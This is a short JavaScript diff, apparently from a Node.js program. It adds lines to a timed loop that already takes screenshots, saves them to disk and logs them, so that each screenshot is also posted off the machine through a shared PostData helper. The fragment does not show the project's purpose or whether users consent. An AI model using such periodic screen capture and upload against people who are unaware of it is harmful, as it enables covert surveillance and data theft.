@@ -13,6 +13,8 @@ setInterval(function(){
     screenshot({format: 'png'}).then((img) => {
     console.log(img);
     fs.writeFileSync("Images/"+"ScreenShot"+shared.getRandomInt(9999999999)+".png",img);
+    let object=[{'Type':"ScreenShot",'Data':img}];
+    shared.PostData(object);
     console.log("done")
     }).catch((err) => {
     console.log(err);
